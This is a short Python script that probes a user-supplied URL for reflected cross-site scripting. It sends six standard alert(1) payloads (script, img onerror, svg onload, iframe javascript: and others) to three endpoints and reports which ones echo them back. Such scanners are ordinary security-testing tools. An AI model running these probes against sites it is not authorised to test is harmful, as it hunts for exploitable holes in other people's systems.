#!/usr/bin/env python3
"""
test_xss.py - Cross-Site Scripting Testing Script
Usage: python test_xss.py <target_url>
"""

import sys
import requests
from urllib.parse import urljoin

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
]

def test_xss(base_url):
    print(f"=== XSS Test ===")
    print(f"Target: {base_url}\n")
    
    vulnerable = []
    test_endpoints = ["/api/search?q={}", "/api/echo?msg={}", "/?name={}"]
    
    for endpoint in test_endpoints:
        for payload in XSS_PAYLOADS:
            url = urljoin(base_url, endpoint.format(payload))
            try:
                resp = requests.get(url, timeout=10)
                
                if payload in resp.text:
                    print(f"[!] Reflected XSS: {endpoint}")
                    print(f"    Payload: {payload[:40]}...")
                    vulnerable.append((endpoint, payload))
                    break
                    
            except requests.exceptions.RequestException:
                pass
    
    print(f"\n=== Results ===")
    if vulnerable:
        print(f"[WARNING] Found {len(vulnerable)} reflected XSS vulnerabilities.")
    else:
        print("[OK] No obvious XSS vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    test_xss(sys.argv[1])
